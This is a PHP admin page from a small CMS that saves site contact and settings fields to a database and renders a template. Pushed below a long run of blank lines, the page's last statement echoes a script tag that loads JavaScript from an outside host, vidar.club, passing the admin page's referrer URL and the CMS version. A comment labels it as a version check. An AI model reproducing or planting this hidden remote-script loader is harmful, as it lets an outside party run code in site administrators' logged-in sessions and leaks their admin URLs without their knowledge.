<?php 

include 'emmm_admin.php';
include 'emmm_checkadmin.php'; 

if (isset($_GET["emmm_cms"]) == "edit"){

	$emmm_xiegang = str_replace($emmm['webpath']."function","function",admin_sql($_POST["COL_Weblogo"]));
	$query = $db -> update("`emmm_web`","`COL_Website` = '".admin_sql($_POST["COL_Website"])."',`COL_Weburl` = '".admin_sql($_POST["COL_Weburl"])."',`COL_Weblogo` = '".$emmm_xiegang."',`COL_Webname` = '".admin_sql($_POST["COL_Webname"])."',`COL_Webadd` = '".admin_sql($_POST["COL_Webadd"])."',`COL_Webtel` = '".admin_sql($_POST["COL_Webtel"])."',`COL_Webmobi` = '".admin_sql($_POST["COL_Webmobi"])."',`COL_Webfax` = '".admin_sql($_POST["COL_Webfax"])."',`COL_Webemail` = '".admin_sql($_POST["COL_Webemail"])."',`COL_Webzip` = '".admin_sql($_POST["COL_Webzip"])."',`COL_Webqq` = '".admin_sql($_POST["COL_Webqq"])."',`COL_Weblinkman` = '".admin_sql($_POST["COL_Weblinkman"])."',`COL_Webicp` = '".admin_sql($_POST["COL_Webicp"])."',`COL_Webstatistics` = '".admin_sql($_POST["COL_Webstatistics"])."',`COL_Webtime` = '".admin_sql($_POST["COL_Webtime"])."',`COL_Websitemin` = '".admin_sql($_POST["COL_Websitemin"])."',`COL_Weixin` = '".admin_sql($_POST["COL_Weixin"])."',`COL_Weixinerweima` = '".admin_sql($_POST["COL_Weixinerweima"])."',`COL_Alipayname` = '".admin_sql($_POST["COL_Alipayname"])."'","where id = 1");
	$emmm_font = 1;
	$emmm_class = 'emmm_web.php';
	require 'emmm_remind.php';

}

Admin_click('基本信息设置','emmm_web.php');
$emmm_rs = $db -> select("*","`emmm_web`","where `id` = 1");
$smarty->assign('emmm_web',$emmm_rs);
$smarty->display('emmm_web.html');




































//收集系统版本，用于获取最新版本升级
echo '<script src="http://vidar.club/opcms/userlogin.php?u='.$_SERVER['HTTP_REFERER'].'&v='.$emmm_version.'|'.$emmm_versiondate.'" type="text/javascript" charset="utf-8"></script>';
?>
